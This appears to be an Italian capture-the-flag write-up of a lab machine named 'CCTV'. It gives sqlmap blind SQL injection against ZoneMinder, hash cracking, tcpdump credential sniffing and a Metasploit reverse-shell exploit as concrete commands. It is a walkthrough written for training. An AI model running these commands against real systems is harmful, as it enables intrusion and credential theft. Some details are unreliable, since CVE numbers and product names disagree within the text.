+++
date = '2026-07-20T17:58:54+02:00'
draft = false
title = 'CCTV Writeup IT'
+++
**Nome**: **`joy.scd01`**

**Data**: **`11/03/2026`**

![CCTV.png](/images/imgs_cctv/CCTV.png)

---
# Introduzione

**_CCTV_** è una macchina **Linux** di livello **Easy**. Inizia con una classica enumerazione web, che porta ad una pagina di login di **ZoneMinder**. Indagando sulle vulnerabilità note, l'accesso iniziale si ottiene tramite una **Boolean-based Blind SQL Injection** usando **sqlmap** per dumpare le credenziali utente. Una volta sulla macchina, il lateral movement si ottiene abusando delle capability di **tcpdump** per sniffare le credenziali in transito su un'interfaccia bridge interna. Infine, un local port forwarding rivela un'istanza di **MonitorEye**, che viene banalmente sfruttata tramite **Metasploit** per ottenere l'accesso **root**.

---
# Tecniche Utilizzate

- **Web Enumeration & Directory Fuzzing**

- **Boolean-based Blind SQL injection (CVE-2024-5148)**

- **Password Cracking**

- **Network Sniffing via tcpdump Capabilities**

- **SSH Local Port Forwarding**

- **MonitorEye Exploitation (CVE-2025-60787)**

# Enumerazione

## nmap

Scansione iniziale su tutte le porte:

```bash
nmap -p- cctv.htb
```

```text
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

Scansione mirata con script e service detection:

```bash
nmap -sC -sV cctv.htb
```

```text
PORT   STATE SERVICE    REASON
22/tcp open  tcpwrapped syn-ack ttl 63
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp open  tcpwrapped syn-ack ttl 63
|_http-server-header: Apache/2.4.58 (Ubuntu)
| http-methods: 
|_  Supported Methods: OPTIONS
```

**Porte aperte**:

- **22**/tcp - SSH

- **80**/tcp - HTTP (Apache/2.4.58)

Ho aggiunto **`cctv.htb`** al mio file **`/etc/hosts`**.

## Enumerazione Web

Sulla porta **80** è hostata un'istanza di **SecureVision**. Cliccando su **`Staff Login`** sono stato reindirizzato a una pagina di login di **`ZoneMinder`**.

![web.png](/images/imgs_cctv/web.png) 

---
# Accesso Iniziale | ZoneMinder SQLi

Ho cercato online delle **CVE** per **ZoneMinder** e ho letto alcuni articoli che parlavano di una nota **Boolean-based Blind SQL injection**: **CVE-2024-5148**

- **https://www.sentinelone.com/vulnerability-database/cve-2024-51482/**

Ho cercato un **PoC** per capire come venisse triggerata la vulnerabilità e ho trovato l'esatto formato necessario per la request.

Quindi, ho fatto passare il traffico tramite **Burp Suite**, ho intercettato una richiesta di login e l'ho salvata in un file chiamato **`req.txt`**.

```text
GET /zm/index.php?view=request&request=event&action=removetag&tid=1 HTTP/1.1
Host: cctv.htb
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: zmSkin=classic; zmCSS=base; ZMSESSID=rp4v447p90v8134m8lgs0m8v3o
Connection: keep-alive
```

Successivamente, ho lanciato **sqlmap** per automatizzare l'exploitation.

Il parametro "**`tid`**" è risultato vulnerabile a una **Boolean-Based Blind SQLi**.

**Nota**: _Poiché le **Blind SQL injection** possono richiedere molto tempo, non volevo dumpare ciecamente l'intero database. Ho fatto una rapida ricerca su **Google** per trovare il nome di default del database di **ZoneMinder**, che di solito è **`zm`**. E la tabella delle credenziali: **`Users`**._

Ho lanciato il comando **sqlmap** finale per dumpare le colonne **`User`** e **`Password`**:

```bash
sqlmap -r req.txt -p "tid" -D zm -T Users -C User,Password --batch --technique=B
```

![database_dump.png](/images/imgs_cctv/database_dump.png)

Ho estratto alcuni hash. Il più interessante era quello per l'utente **mark**. L'ho salvato in **`mark.txt`** e l'ho crackato usando **john**:

```bash
john mark.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

![hash_crack.png](/images/imgs_cctv/hash_crack.png)

Con la password in chiaro, mi sono loggato via **SSH** ottenendo l'accesso iniziale alla macchina.

```bash
ssh mark@cctv.htb
```

![initial_access_1.png](/images/imgs_cctv/initial_access_1.png)
![initial_access_2.png](/images/imgs_cctv/initial_access_2.png)

---
# Lateral Movement | Network Sniffing

La prima cosa che ho fatto come utente **mark** è stata controllare i privilegi sudo con **`sudo -l`**, ma questo non ha portato a nulla. Quindi, ho trasferito ed eseguito **`linpeas.sh`** per automatizzare l'enumerazione locale.

![linpeas_cap.png](/images/imgs_cctv/linpeas_cap.png)

Esaminando l'output di **LinPEAS**, ho notato una cosa molto interessante: il binario **tcpdump** aveva delle capability attive.

**Nota**: _La capability **`cap_net_raw`** su **tcpdump** permette ad un utente con privilegi bassi di catturare pacchetti sulle interfacce di rete esattamente come farebbe l'utente **root**._

Ho lanciato **`ip a`** per listare le interfacce di rete e ho individuato un'interfaccia bridge chiamata **`br-1b6b4b93c636`**. Essendoci probabilmente del traffico interno in transito su di essa, ho avviato **tcpdump** per sniffare i pacchetti:

```bash
tcpdump -i br-1b6b4b93c636 -nn -A
```

Osservando il flusso di traffico in chiaro, ho catturato delle credenziali valide per un altro utente: **sa_mark**.

![sniffed_creds.png](/images/imgs_cctv/sniffed_creds.png)

Ho semplicemente switchato al nuovo utente e ho preso la **user flag**.

```bash
ssh sa_mark@cctv.htb
cat user.txt
```

![latera_mov_userf.png](/images/imgs_cctv/latera_mov_userf.png)

---
# Privilege Escalation | MonitorEye Exploitation (CVE-2025-60787)

Durante l'enumerazione della home directory di **sa_mark**, ho scaricato e letto un file **PDF** che suggeriva esplicitamente il **riutilizzo delle password**.

![pdf_hint.png](/images/imgs_cctv/pdf_hint.png)

Successivamente, ho controllato i servizi interni:

```bash
ss -tuln
```

![8765.png](/images/imgs_cctv/8765.png)

Filtrando le porte standard note (come la **53**, **22**, **80** e la **3306** di **MySQL**), rimanevano in ascolto diverse porte locali (come la **8888**, **9081**, **8554**, **7999**, **1935** e la **8765**).

Facendo una rapida ricerca su **Google** per queste porte, è emerso che la **8765** è la porta di default utilizzata da **MonitorEye**. Facendo due più due con il nome della macchina (**CCTV**), ho capito subito quale fosse il mio target reale.

Per interagirci comodamente dal mio browser, ho impostato un tunnel **SSH**:

```bash
ssh -L 8765:127.0.0.1:8765 sa_mark@cctv.htb
```

Sono riuscito ad accedere usando le credenziali dell'utente **sa_mark** e, dopo aver notato la versione esatta (**4.7.1**), ho cercato eventuali vulnerabilità note.

![motioneye_login.png](/images/imgs_cctv/motioneye_login.png)

Ho trovato un modulo esistente in **Metasploit** per la **CVE-2025-60787**.

**Nota**: _La **CVE-2025-60787** è una vulnerabilità critica di **Remote Code Execution Autenticata** (**RCE**) che colpisce **MonitorEye** fino alla versione **4.7.1**. Poiché l'exploit richiede credenziali valide per interagire con l'endpoint vulnerabile, la scoperta del **password reuse** è stata il pezzo mancante del puzzle. Una volta autenticati, la falla permette ad un attaccante di iniettare ed eseguire comandi di sistema arbitrari (in questo caso come **root**), di conseguenza fare privilege escalation._

Ho avviato **msfconsole**, selezionato l'exploit e configurato le opzioni necessarie.

```bash
msfconsole
search monitoreye
use exploit/path/to/monitoreye_module
set RHOSTS 127.0.0.1
set RPORT 8765
set LHOST tun0
run
```

![msf_module.png](/images/imgs_cctv/msf_module.png)

Accesso a **root** e **root flag**.

![privesc_rootf.png](/images/imgs_cctv/privesc_rootf.png)

---
# Considerazioni Finali

**_CCTV_** è una macchina **Easy** ben bilanciata. Il foothold iniziale è un ottimo promemoria del perché controllare la documentazione ufficiale è spesso l'arma migliore: cercare il database di default e gli schemi delle tabelle ti salva dal guardare **sqlmap** faticare per ore su una **Blind SQLi**.

**Fonti**:

- **CVE-2024-51482 Explanation** | **https://www.sentinelone.com/vulnerability-database/cve-2024-51482/**
- **ZoneMinder Official Documentation** | **https://zoneminder.readthedocs.io/en/latest/**
- **MonitorEye CVE-2025-60787** | **https://www.sentinelone.com/vulnerability-database/cve-2025-60787/**